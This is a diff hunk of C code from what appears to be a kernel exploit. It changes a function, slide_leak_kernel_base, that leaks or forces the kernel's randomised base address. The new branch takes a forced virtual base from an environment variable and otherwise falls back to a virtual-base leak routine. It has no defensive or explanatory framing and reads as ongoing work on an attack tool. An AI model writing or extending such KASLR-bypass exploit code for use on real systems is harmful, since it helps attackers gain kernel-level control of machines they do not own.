@@ -1112,7 +1641,25 @@ int slide_leak_kernel_base(void) {
       }
     }
     pr_info("slide forced p0 offset=%08llx\n", value);
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
+    if (virtual_base_arg && *virtual_base_arg) {
+      char *base_end = NULL;
+      errno = 0;
+      unsigned long long virtual_base =
+          strtoull(virtual_base_arg, &base_end, 0);
+      slide_p0_offset = (uintptr_t)value;
+      if (errno || base_end == virtual_base_arg || *base_end ||
+          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
+        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
+        return 0;
+      }
+      return 1;
+    }
+    return slide_leak_virtual_base((uintptr_t)value);
+#else
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+#endif
   }
   return slide_leak_physical_base();
 #else
